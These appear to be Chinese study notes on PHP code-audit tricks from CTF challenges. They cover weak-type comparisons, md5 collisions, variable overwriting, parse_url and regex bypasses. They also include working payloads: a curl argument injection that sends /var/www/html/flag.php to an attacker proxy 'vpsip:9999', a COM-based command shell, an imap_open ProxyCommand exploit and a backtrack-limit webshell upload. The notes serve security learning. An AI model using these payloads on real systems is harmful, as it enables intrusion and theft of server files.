# 安全牛PHP代码审计学习笔记


## 0x00 弱类型相关要点及md5

$a == $b 等于TRUE，如果类型转换后$a 等于$b。  
$a === $b 全等TRUE，如果$a 等于$b，并且它们的类型也相同。

如果一个数值和一个字符串比较，那么会将字符串转换为数值。

<pre class="wp-block-code"><code>''== 0 == false
'123' == 123
'abc' == 0
'123a' == 123 
0x01 == 1
'0e123456789' == '0e987654321' 
&#91;false] == &#91;0] == &#91;NULL] == &#91;'']
NULL == false == 0
true == 1</code></pre>

**MD5案例1**

<pre class="wp-block-code"><code>&lt;?php
ini_set("display error", false);
error_reporting(0);
if($_POST&#91;'param1']!=$_POST&#91;'param2']&&md5($_POST&#91;'param1'])==md5($_POST&#91;'param2']))
{
	die("success");
}
else
{
	echo "fail";
}</code></pre>

在PHP中，利用”!=”或”==”来对哈希值进行比较时，PHP会把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。参考：<a href="https://blog.csdn.net/nzjdsds/article/details/90085112" target="_blank" rel="noreferrer noopener" rel="nofollow" >https://blog.csdn.net/nzjdsds/article/details/90085112</a>

**MD5案例2**

<pre class="wp-block-code"><code>&lt;?php
ini_set("display error", false);
error_reporting(0);
if($_POST&#91;'param1']!==$_POST&#91;'param2']&&md5($_POST&#91;'param1'])===md5($_POST&#91;'param2']))
{
	die("success");
}
else
{
	echo "fail";
}</code></pre>

通过函数返回，返回不是md5，例如数组：param1[]=1&param2[]=2

**MD5案例3**

<pre class="wp-block-code"><code>&lt;?php
ini_set("display error", false);
error_reporting(0);
if((string)$_POST&#91;'param1']!==(string)$_POST&#91;'param2']&&md5($_POST&#91;'param1'])===md5($_POST&#91;'param2']))
{
	die("success");
}
else
{
	echo "fail";
}</code></pre>

md5强碰撞<figure class="wp-block-image size-full">

<img loading="lazy" width="843" height="228" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-292.png" alt="" class="wp-image-3376" /></figure> 

通过python脚本解码

```python
from urllib import parse
a = parse.quote(open('1.txt','rb').read())
b = parse.quote(open('2.txt','rb').read())
print ("a:" + a + "\n")
print ("b:" + b)

a:%14%97%3DYd%EF%AC%9BF%FF%12%16%0AL%FA%1E9wi%C9r%9F%3D%AA%2C%F6x%B1%93.%10%A0%60%CB%BB%09%F2%0D.%29%CF%25%CB%FA%DBw4rH%D6%1B%8A%23%11%7C%D5%D8G%DE%8F%19%7C%8D%BEd%C0C%D6x%91%D3%02G7/%E47%0C%1B%FA%9E%A7%40%F9%12%3B%A0%20%C9%7B%F5%C4%D1%19Y%A2%B7F%17%E20%DCrS%CF%B0%C0%EFr~W%E6%0A%E8%93KS%1E%F7%F0%CA%9A%3Bf%2AQ%05%EC

b:%14%97%3DYd%EF%AC%9BF%FF%12%16%0AL%FA%1E9wiIr%9F%3D%AA%2C%F6x%B1%93.%10%A0%60%CB%BB%09%F2%0D.%29%CF%25%CB%FA%DB%F74rH%D6%1B%8A%23%11%7C%D5%D8G%DE%0F%19%7C%8D%BEd%C0C%D6x%91%D3%02G7/%E47%0C%1B%FA%9E%A7%40y%12%3B%A0%20%C9%7B%F5%C4%D1%19Y%A2%B7F%17%E20%DCrS%CF%B0%C0%EFr%FEV%E6%0A%E8%93KS%1E%F7%F0%CA%9A%3B%E6%2AQ%05%EC
```

**sha相关案例**

<pre class="wp-block-code"><code>&lt;?php
ini_set("display error", false);
error_reporting(0);
$flag = "flag";
if(isset($_GET&#91;'name']) and isset($_GET&#91;'password']))
{
	if ($_GET&#91;'name'] == $_GET&#91;'password'])
		echo '&lt;p&gt;Your password can not br yout name!&lt;/p&gt;';
	else if (sha1($_GET&#91;'name']) === sha1($_GET&#91;'password'])
		die('Flag:' .$flag);
	else
		echo '&lt;p&gt;Invalid password.&lt;/p&gt;';
}
else
	echo "&lt;p&gt;Login first!&lt;/p&gt;";</code></pre>

与 MD5案例2 类似

**Md5与SQL注入的融合**

<pre class="wp-block-code"><code>&lt;?php
error_reporting(0);
$link = mysql_connect('localhost','root','root');
if(!$link){
	die('Could not connect to MySQL: '.mysql_error());
}

$db = mysql_select_db("test", $link);
if(!$db)
{
	echo 'select db error';
	exit();
}

$password = $_GET&#91;'password'];
$sql = "SELECT * FROM admin WHERE pass = '".md5($password, true)."'";

$result=mysql_query($sql) or die('&lt;pre&gt;'. mysql_error().'&lt;/pre&gt;');
$rowl= mysql_fetch_row($result);
var_dump($row1);
mysql_close($link);</code></pre>

md5为true 时，返回 16 字符长度的原始二进制格式的摘要。例如：echo md5('ffifdyop',true);<figure class="wp-block-image size-full">

<img loading="lazy" width="449" height="31" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-293.png" alt="" class="wp-image-3380" /> </figure> 

## 0x01 弱类型相关函数

**JSON相关问题**

<pre class="wp-block-code"><code>&lt;?php
highlight_file(__FIlE__);
include "flag. php";
if (isset($_POST&#91;'message'])) {
	$message = json_decode($_POST&#91;'message']);
	if($message-&gt;key == $key) {
		echo $flag;
	}
	else {
		echo "fail";
	}
}
else{
	echo "~~~~";
}
?&gt;</code></pre>

json_decode对 JSON 格式的字符串进行解码，构造message={"key":0}。

**SWITCH相关问题**

如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型。

<pre class="wp-block-code"><code>&lt;?php
highlight_file(__FIlE__);
$i = "3name";
switch ($i){
case 0:
case 1:
case 2:
	echo "this is two";
	break;
case 3:
	echo "flag";
break;
}
?&gt;</code></pre>

执行的结果是`flag`。

**STRCMP相关问题**

`strcmp(string $str1, string $str2)`，二进制安全字符串比较，如果 `str1` 小于 `str2` 返回 < 0； 如果 `str1` 大于 `str2` 返回 > 0；如果两者相等，返回 0。比较过程应该是转化成ASCII后逐字节进行比较，然后根据运算结果来决定返回值。

strcmp('a',1)-->48， strcmp('1cc','1ca')-->2。

<pre class="wp-block-code"><code>&lt;?php
highlight_file(__FIlE__);
include "flag.php";
if(isset($_POST&#91;'password'])){
	if (strcmp($_POST&#91;'password'], $password)==0){
		echo "Right!!! login success";
		echo $flag;
		exit();
} else {
	echo "Wrong password..";
		}
}
?&gt;</code></pre>

构造函数返回值为NULL，弱类型与0相等。

**IN_ARRAY相关问题**

`in_array`，检查数组中是否存在某个值，in_array(mixed`$needle`, array `$haystack`, bool `$strict` = `false`): bool。大海捞针，在大海（`haystack`）中搜索针（ `needle`），如果没有设置 `strict` 则使用宽松的比较。如果第三个参数 `strict` 的值为 **`true`** 则 **in_array()** 函数还会检查 `needle` 的类型是否和 `haystack` 中的相同。

<pre class="wp-block-code"><code>&lt;?php
highlight_file(__FIlE__);
$array = &#91;0,1,2,'3'];
var_dump(in_array('abc', $array));
var_dump(in_array('1bc', $array));
var_dump(in_array(3, $array));</code></pre>

结果会是bool(true)，bool(true)，bool(true)。

**ARRAY_SEARCH相关问题**

a`rray_search`，在数组中搜索给定的值，如果成功则返回首个相应的键名，与上面的类似。

<pre class="wp-block-code"><code>&lt;?php
highlight_file(__FIlE__);
$array = &#91;0,1,2,'3'];
var_dump(array_search('abc', $array));
var_dump(array_search('1bc', $array));
var_dump(array_search(3, $array));
var_dump(array_search('3', $array));</code></pre>

结果为int(0)，int(1)，int(3)，int(3)。

此函数可能返回布尔值 false，但也可能返回等同于 false 的非布尔值。

<pre class="wp-block-code"><code>&lt;?php
#highlight_file(__FIlE__);
include "flag.php"
if(!is_array($_GET&#91;'test'])){exit();}
$test = $_GET&#91;'test'];
for($ i= 0; $i&lt;count($test); $i++){
	if($test&#91;$i] === "admin"){
	echo "error";
	exit();
	}
	$test&#91;$i]=intval($test&#91;$i]);
if(array_search("admin", $test)===0){
	echo $flag;
}
else{
	echo "false";
}</code></pre>

传入test[]=0，即可获得flag。

**strpos相关问题**

`strpos`，查找字符串首次出现的位置<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-294.png" alt="" class="wp-image-3391" width="509" height="92" /> </figure> 

如果逻辑中出现用strpos来做判断，那就有可能带来安全问题。

## 0x02 变量覆盖问题

**Extract()**

`extract`，从数组中将变量导入到当前的符号表。

范例

<pre class="wp-block-code"><code>
&lt;?php

/* 假定 $var_array 是 wddx_deserialize 返回的数组*/

$size = "large";
$var_array = array("color" =&gt; "blue",
                   "size"  =&gt; "medium",
                   "shape" =&gt; "sphere");
extract($var_array, EXTR_PREFIX_SAME, "wddx");

echo "$color, $size, $shape, $wddx_size\n";

?&gt;</code></pre>

`EXTR_PREFIX_SAME` 如果有冲突，在变量名前加上前缀。输出结果为：blue, large, sphere, medium。

<pre class="wp-block-code"><code>&lt;?php
highlight_file(__FIlE__);
include "flag.php"
extract($_GET);
if(isset($gift)){
	$content = trim(file_get_contents($flag));
		if($gift == $content){
			echo $trueflag;
}
	else{
		echo 'Oh..';
	}
}
?&gt;</code></pre>

构造gift=&flag=，得到flag。

**$$**

遍历初始化变量，由于php中可以使用$$声明变量，因此当在遍历数组时可能会覆盖原来的值。

<pre class="wp-block-code"><code>&lt;?php
highlight_file(__FIlE__);
$a = "helloworld";
echo "$a";
echo "&lt;br&gt;";
foreach ($_GET as $key =&gt; $value) {
	$$key=$value;
}
echo "$a";
?&gt;</code></pre>

如果构造a=123，就会输出helloworld，123。

<pre class="wp-block-code"><code>&lt;?php
highlight_file(__FIlE__);
include "flag.php"
$_403 = "Access Denied";
$_200 = "Welcome Admin";

if ($_SERVER&#91;"REQUEST_METHOD"] != "POST")
	{die("BugsBunnyCTF is here :p...");}

if ( !isset($_POST&#91;"flag"]))
	{die($_403);}

foreach ($_GET as $key =&gt; $value) {
	$$key=$$value;
}

foreach ($_POST as $key =&gt; $value) {
	$$key=$value;
}

if ( $_POST&#91;"flag"]!==$flag)
	{die($_403);}

echo "This is your flag :".$flag."\n";
die($_200);
?&gt;</code></pre>

这里用POST随便传一个flag=111，GET传\_200=flag，通过die($\_200)得到flag。

**parse_str()**

`parse_str`， 将字符串解析成多个变量。

范例

<pre class="wp-block-code"><code>
&lt;?php
$str = "first=value&arr&#91;]=foo+bar&arr&#91;]=baz";

// 推荐用法
parse_str($str, $output);
echo $output&#91;'first'];  // value
echo $output&#91;'arr']&#91;0]; // foo bar
echo $output&#91;'arr']&#91;1]; // baz

// 不建议这么用
parse_str($str);
echo $first;  // value
echo $arr&#91;0]; // foo bar
echo $arr&#91;1]; // baz
?&gt;</code></pre>

<pre class="wp-block-code"><code>&lt;?php
include "flag.php"
if (empty($_GET&#91;'id']))
	{
		show_source(__FILE__);
		die();
	}
	else
	{
		include ('flag.php');
		$a = 'www.OPENCT.com';
		$id = $_GET&#91;'id'];
		@parse_str($id);
		if ($a&#91;0] != 'QNKCDZO' && md5($a&#91;0]) == md5('QNKCDZO'))
		{
			echo $flag;
		}
		else
		{
			exit('其实很简单其实并不难！');
		}
	}
?&gt;</code></pre>

构造id=a[0]=s878926199a，得到flag。

由于 PHP 的变量名不能带「点」和「空格」，所以它们会被转化成下划线。

## 0x03 空白符问题

```php
<?php

$info = ""; 
$req = [];
$flag="flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}";

ini_set("display_error", false); //为一个配置选项设置值
error_reporting(0); //关闭所有PHP错误报告
# 条件一，要设置number参数
if(!isset($_GET['number'])){
   header("hint:26966dc52e85af40f59b4fe73d8c323a.txt"); //HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt

   die("have a fun!!"); //die — 等同于 exit()

}

foreach([$_GET, $_POST] as $global_var) {  //foreach 语法结构提供了遍历数组的简单方式 
    foreach($global_var as $key => $value) { 
        $value = trim($value);  //trim — 去除字符串首尾处的空白字符（或者其他字符）
        is_string($value) && $req[$key] = addslashes($value); // is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串
    } 
} 


function is_palindrome_number($number) { 
    $number = strval($number); //strval — 获取变量的字符串值
    $i = 0; 
    $j = strlen($number) - 1; //strlen — 获取字符串长度
    while($i < $j) { 
        if($number[$i] !== $number[$j]) { 
            return false; 
        } 
        $i++; 
        $j--; 
    } 
    return true; 
} 

# 条件二 number的值不能是数字
if(is_numeric($_REQUEST['number'])) //is_numeric — 检测变量是否为数字或数字字符串 
{

   $info="sorry, you cann't input a number!";

}

# 条件三 trim处理过的number要等于取整之后的值
elseif($req['number']!=strval(intval($req['number']))) //intval — 获取变量的整数值
{

     $info = "number must be equal to it's integer!! ";  

}

# 条件四 trim处理过的number经过反转之后要等于其本身
else
{

     $value1 = intval($req["number"]);
     $value2 = intval(strrev($req["number"]));  
     
     if($value1!=$value2){
          $info="no, this is not a palindrome number!";
     }
     else
     {
     
          if(is_palindrome_number($req["number"])){
              $info = "nice! {$value1} is a palindrome number!"; 
          }
          else
          {
             $info=$flag;
          }
     }

}

echo $info;
```

intval()成功时返回var 的integer 值，失败时返回0。空的array 返回0，非空的array 返回1。

最大的值取决于操作系统。32 位系统最大带符号的integer 范围是-2147483648 到2147483647。64 位系统上，最大带符号的integer 值是9223372036854775807。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-296.png" alt="" class="wp-image-3400" width="494" height="617" /> </figure> 

浮点数的精度<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-297.png" alt="" class="wp-image-3402" width="295" height="529" /> </figure> 

is_numeric<figure class="wp-block-image size-full">

<img loading="lazy" width="1174" height="623" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-298.png" alt="" class="wp-image-3404" /> </figure> 

如果不指定第二个参数，**trim()** 将去除这些字符：

<pre class="wp-block-code"><code>    " " (ASCII 32 (0x20))，普通空格符。
    "\t" (ASCII 9 (0x09))，制表符。
    "\n" (ASCII 10 (0x0A))，换行符。
    "\r" (ASCII 13 (0x0D))，回车符。
    "\0" (ASCII 0 (0x00))，空字节符。
    "\x0B" (ASCII 11 (0x0B))，垂直制表符。</code></pre><figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-299.png" alt="" class="wp-image-3406" width="397" height="87" /> </figure> 

解法参考<a rel="noreferrer noopener" href="https://www.cnblogs.com/mkdd/p/13023618.html" target="_blank" rel="nofollow" >https://www.cnblogs.com/mkdd/p/13023618.html</a>。

## 0x04 伪随机数问题

`mt_srand` ，播下一个更好的随机数发生器种子。如果我们自己指定范围，如果过小则很容易被爆破出来的，因此大多实际应用中都是不指定范围，mt\_rand()函数默认范围是0到mt\_getrandmax()之间的伪随机数。

同时相同的种子生成的随机数是相同的，所以可以通过逆推mt_rand的种子来获得同页面的另一个rand的值。

工具：<a href="https://www.openwall.com/php_mt_seed/" data-type="URL" data-id="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noreferrer noopener" rel="nofollow" >php_mt_seed</a><figure class="wp-block-image size-full">

<img loading="lazy" width="170" height="52" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-300.png" alt="" class="wp-image-3411" /></figure> 

## 0x05 其他函数问题

**运算符**

<pre class="wp-block-code"><code>&lt;?php
include "flag.php"
$a = 'test';
$b = 'test2';
$a = $_GET&#91;'a'];
$b = $_GET&#91;'b'];
$c = is_numeric($a) and is_numeric($b);
if ($c){
	if (is_numeric($a)){
		if (is_numeric($b)){
			echo "is_numeric(b)";
		}else{
			echo $flag;
		}
	}else{
		echo 'is_numeric(a) error';
	}
}
else{
	print "is_numeric(a) and is_numeric(b) error!";
}
?></code></pre><figure class="wp-block-image size-full">

<img loading="lazy" width="743" height="633" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-311.png" alt="" class="wp-image-3427" /> </figure> 

所以`$c = is_numeric($a) and is_numeric($b);`实际上是`<span class="has-inline-color has-vivid-red-color">(</span>$c = is_numeric($a)<span class="has-inline-color has-vivid-red-color">)</span> and is_numeric($b);`

**parse_url**

`parse_url` ，解析 URL，返回其组成部分。本函数不是用来验证给定 URL 的合法性的，只是将其分解为下面列出的部分。不完整的 URL 也被接受，parse\_url() 会尝试尽量正确地将其解析。parse\_url() 是专门用来解析 URL 而不是 URI 的。不过为遵从 PHP 向后兼容的需要有个例外，对 file:// 协议允许三个斜线（file:///...）。其它任何协议都不能这样。

范例

<pre class="wp-block-code"><code>
&lt;?php
$url = 'http://username:password@hostname/path?arg=value#anchor';

print_r(parse_url($url));

echo parse_url($url, PHP_URL_PATH);
?></code></pre>

输出结果

<pre class="wp-block-code"><code>Array
(
    &#91;scheme] => http
    &#91;host] => hostname
    &#91;user] => username
    &#91;pass] => password
    &#91;path] => /path
    &#91;query] => arg=value
    &#91;fragment] => anchor
)
/path</code></pre>

如果指定了component 参数，parse\_url() 返回一个string （或在指定为PHP\_URL_PORT 时返回一个integer）而不是array。如果URL 中指定的组成部分不存在，将会返回NULL。http:///会被返回false。

<pre class="wp-block-code"><code>&lt;?php
    include "config.php";
    $number1 = rand(1,100000000000000);
    $number2 = rand(1,100000000000);
    $number3 = rand(1,100000000);
    $url = urldecode($SERVER&#91;'REQUEST_URI']);
    $url = parse_url($url, PHP_URL_QUERY);
    if (preg_match("/_/i", $url))
    {
        die("...");
    }
    if (preg_match("/0/i", $url))
    {
        die("...");
    }
    if (preg_match("/\w+/i", $url))
    {
        die("...");
    }
    if(isset($GET&#91;'_']) && !empty($GET&#91;'_']))
    {
        $control = $GET&#91;'_'];
        if(!in_array($control, array(0,$number1)))
        {
            die("fail1");
        }
        if(!in_array($control, array(0,$number2)))
        {
            die("fail2");
        }
        if(!in_array($control, array(0,$number3)))
        {
            die("fail3");
        }
        echo $flag;
    }
    show_source(__FILE__);
    ?></code></pre>

可以构造`///php/prase_url/ prase_url.php?_=a`或者 `///php/prase_url/ prase_url.php?.=a` 

**escapeshellarg 和 escapeshellcmd**

`escapeshellarg` , 把字符串转码为可以在 shell 命令里使用的参数。escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。

`escapeshellcmd`，shell 元字符转义。escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。

<pre class="wp-block-code"><code>&lt;?php 
print_r(escapeshellcmd("who 'ami"));
print_r(escapeshellarg("who 'ami"));
print_r(escapeshellcmd("who''ami"));
print_r(escapeshellarg("who''ami"));
?></code></pre>

对应的结果如下：

<pre class="wp-block-code"><code>who \'ami
'who '\''ami'
who''ami
'who'\'''\''ami'</code></pre>

主要区别在于，对于单个单引号, escapeshellarg 函数转义后,会在字符串开始和结尾各加一个单引号，还会在被转义的单引号的左右各加一个单引号,但 escapeshellcmd 函数是直接加一个转义符，对于成对的单引号, escapeshellcmd 函数默认不转义,但 escapeshellarg 函数转义。

例题如下，分析参考<a rel="noreferrer noopener" href="https://blog.csdn.net/weixin_43999372/article/details/86631794" target="_blank" rel="nofollow" >https://blog.csdn.net/weixin_43999372/article/details/86631794</a>

```php
<?php
highlight_file('index.php');
function waf($a){
    foreach($a as $key => $value){
        if(preg_match('/flag/i',$key)){
            exit('are you a hacker');
        }
    }
}

/*循环获取字符串 GET、POST、COOKIE ，并依次赋值给变量 $__R 。先判断 $$__R 变量是否存在数据，如果存在，则继续判断超全局数组 GET、POST、COOKIE 中是否存在键值相等的，如果存在，则删除该变量。GET提交flag=123，接着通过POST请求提交 _GET[flag]=123，当开始遍历 $_POST 超全局数组的时候，$_k=_GET $__v=Array ( [flag] => 123 ) 所以__k 就是 $_GET,即GET提交的值Array ( [flag] => 123 )此时__k == $__v 成立，变量 $_GET就被删除。*/

foreach(array('_POST', '_GET', '_COOKIE') as $__R) {
    if($$__R) { 
        foreach($$__R as $__k => $__v) { 
            if(isset($$__k) && $$__k == $__v) unset($$__k); 
        }
    }

}

if($_POST) { waf($_POST);}
if($_GET) { waf($_GET); }
if($_COOKIE) { waf($_COOKIE);}

/*extract把传递的_GET注册为$_GET,GET中传递的就有我们需要的参数*/
if($_POST) extract($_POST, EXTR_SKIP);
if($_GET) extract($_GET, EXTR_SKIP);

if(isset($_GET['flag'])){
    if($_GET['flag'] === $_GET['hongri']){
        exit('error');
    }
    if(md5($_GET['flag'] ) == md5($_GET['hongri'])){
        $url = $_GET['url'];
        $urlInfo = parse_url($url);
        if(!("http" === strtolower($urlInfo["scheme"]) || "https"===strtolower($urlInfo["scheme"]))){
            die( "scheme error!");
        }
        $url = escapeshellarg($url);
        $url = escapeshellcmd($url);
        system("curl ".$url);
    }
}
?>
```

在 curl 中存在 -F 提交表单的方法，也可以提交文件。 -F <key=value> 向服务器POST表单，例如： curl -F “web=@index.html;type=text/html” url.com 。提交文件之后，利用代理的方式进行监听，这样就可以截获到文件了。目的构造的payload如下：

```
GET请求：
http://url?flag=aabg7XSs&hongri=QNKCDZO&url=http://baidu.com/ -F file=@/var/www/html/flag.php -x vpsip:9999

POST请求：
_GET[flag]=aabg7XSs&_GET[hongri]=QNKCDZO&_GET[url]=http://baidu.com/ -F file=@/var/www/html/flag.php -x vpsip:9999
```

但需要用到escapeshellarg和escapeshellcmd来完成参数逃逸，最后构造的payload为：

```
GET请求：
http://url?flag=aabg7XSs&hongri=QNKCDZO&url=http://baidu.com/' -F file=@/var/www/html/flag.php -x vpsip:9999

POST请求：
_GET[flag]=aabg7XSs&_GET[hongri]=QNKCDZO&_GET[url]=http://baidu.com/’ -F file=@/var/www/html/flag.php -x vpsip:9999
```

实际传入的为：

<pre class="wp-block-code"><code>‘http://www.baidu.com/’\\’’ -F file=@/var/www/html/flag.php -x vpsip:9999\’</code></pre>

## 0x06 正则匹配相关问题

例题代码

<pre class="wp-block-code"><code>&lt;?php
function is_php($data){
    return preg_match('/&lt;\?.*&#91;(`;?>].*/is', $data);
}

if(empty($_FILES)) {
    die(show_source(__FILE__));
}

$user_dir = 'data/' . md5($_SERVER&#91;'REMOTE_ADDR']);
$data = file_get_contents($_FILES&#91;'file']&#91;'tmp_name']);
if (is_php($data)) {
    echo "bad request";
} else {
    @mkdir($user_dir, 0755);
    $path = $user_dir . '/' . random_int(0, 10) . '.php';
    move_uploaded_file($_FILES&#91;'file']&#91;'tmp_name'], $path);

    header("Location: $path", true, 303);
}</code></pre>

在<a rel="noreferrer noopener" href="https://regexper.com/" target="_blank" rel="nofollow" >https://regexper.com/</a>输入``/<\?.<em>[(`;?>].</em>/i``，可以在线生成可视化的图像，方便分析。<figure class="wp-block-image size-full">

<img loading="lazy" width="474" height="255" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-312.png" alt="" class="wp-image-3438" /> </figure> 

**正则表达式的贪婪与非贪婪模式**  

String str="abcaxc";  
Patter p="ab.*c";

贪婪匹配:正则表达式一般趋向于最大长度匹配，也就是所谓的贪婪匹配。如上面使用模式p匹配字符串str，结果就是匹配到：abcaxc(ab.*c)。  
非贪婪匹配：就是匹配到结果就好，就少的匹配字符。如上面使用模式p匹配字符串str，结果就是匹配到：abc(ab.*c)。

量词：

<pre class="wp-block-code"><code>{m,n}：m到n个
*：任意多个
+：一个到多个
？：0或一个</code></pre>

源字符串: aaab 正则: .*?b

匹配过程开始的时候, “.\*?”首先取得匹配控制权, 因为是非贪婪模式, 所以优先不匹配, 将匹配控制交给下一个匹配字符”b”, “b”在源字符串位置1匹配失败(“a”), 于是回溯, 将匹配控制交回给”.\*?”, 这个时候, “.*?”匹配一个字符”a”,并再次将控制权交给”b”, 如此反复, 最终得到匹配结果, 这个过程中一共发生了3次回溯。<figure class="wp-block-image size-full">

<img loading="lazy" width="1373" height="580" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-313.png" alt="" class="wp-image-3441" /> </figure> 

PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit。

当超过回溯次数上限后，函数返回值会变成false而不是0或者1。可以利用这个漏洞绕过正则匹配，上传一句话木马。

<pre class="wp-block-code"><code>&lt;?php 
$a = '&lt;?php phpinfo();//'.str_repeat('a', 9999996);
file_put_contents('exp.php', $a);
?></code></pre>

## 0x07 Disable_function绕过

**黑名单绕过**

phpinfo的disable\_functions显示禁用的函数，不在列表之中，例如system exec shell\_exec等被禁用了，但是可以用assert等代替。或者scandir等用其他函数实现需要的功能。

**扩展使用**

windows下COM（系统组件）

<pre class="wp-block-code"><code>&lt;?php 
$command = $_GET&#91;'a'];
$wsh = new COM('WScript.shell');//生成一个COM对象 Shell.Application也可
$exec = $wsh->exec("cmd /c".$command);//调用对象方法来执行命令
$stdout = $exec->StdOut();
$stroutput = $stdout->ReadALL();
echo $stroutput;
?></code></pre>

pcntl 扩展

`pcntl_exec` ，在当前进程空间执行指定程序。

imap_open()

i`map_open` ,Open an IMAP stream to a mailbox，公开的exp如下：

<pre class="wp-block-code"><code>&lt;?php
$payload = "echo fsfasaf|tee /tmp/2.txt";
$encoded = base64_encode($payload);
$mailbox = "any -o ProxyCommand=echo\t".$encoded."|base64\t-d|bash";
@imap_open('{'.$mailbox.'}:143/imap}INBOX', '', '');
?></code></pre>

还有ImageMagic等，其实就是一些不在列表之中，但是又能执行命令的函数。

**LD_PRELOAD**

LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。<figure class="wp-block-image size-full">

<img loading="lazy" width="1384" height="615" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-316.png" alt="" class="wp-image-3452" /> </figure> 

a.c gcc a.c -o a<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-317.png" alt="" class="wp-image-3453" width="437" height="244" /> </figure> 

gcc -fPIC -shared b.c -o b.so，然后export LD_PRELOAD="./b.so"<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-318.png" alt="" class="wp-image-3454" width="695" height="123" /> </figure> 

strace -f php mail.php 2>&1 | grep -A2 -B2 execve<figure class="wp-block-image size-full">

<img loading="lazy" width="1116" height="371" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-319.png" alt="" class="wp-image-3455" /> </figure> 

readelf -Ws /usr/sbin/sendmail<figure class="wp-block-image size-full">

<img loading="lazy" width="1233" height="439" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-322.png" alt="" class="wp-image-3458" /></figure> 

## 0x08 找源码、扫描、FUZZ

<pre class="wp-block-code"><code>右键源代码

代码压缩包泄漏

.git源码
https:&#47;&#47;github.com/lijiejie/GitHack
.DS_Store泄漏
https://github.com/lijiejie/ds_store_exp
SVN代码泄漏
https://github.com/kost/dvcs-ripper

敏感信息--Robots.txt

备份文件--Index.php.bak,Index.php.swp</code></pre>

dirsearch、御剑等等

FUZZ例题

<pre class="wp-block-code"><code>&lt;?php
$action = $_GET&#91;'action'] ?? '';
$arg = $_GET&#91;'arg'] ?? '';

if(preg_match('/^&#91;a-z0-9_]*$/isD', $action)) {
    show_source(__FILE__);
} else {
    $action('', $arg);
}</code></pre>

bp的intruder模块设置action=$%00$var_dump测试，`%5c`时通过。
